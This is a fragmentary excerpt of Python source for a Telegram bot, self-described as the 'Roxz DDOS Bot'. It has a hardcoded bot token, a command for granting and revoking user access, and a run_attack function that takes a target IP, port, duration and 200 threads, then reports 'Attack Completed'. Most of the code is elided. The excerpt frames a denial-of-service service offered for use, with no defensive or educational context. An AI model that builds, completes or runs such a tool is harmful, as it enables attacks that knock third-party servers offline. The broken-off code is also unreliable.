...
TELEGRAM_BOT_TOKEN = '7562175018:AAFkmelDgVDy6XIxf9AbikUcMuW1Lv-Mock'
...
async def Roxz(update: Update, context: CallbackContext):
    ...
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /Roxz <add|rem> <user_id>*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    threads = 200         # Set your desired number of threads
    ...
    try:
        ...
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Roxz DDOS Bot!*", parse_mode='Markdown')
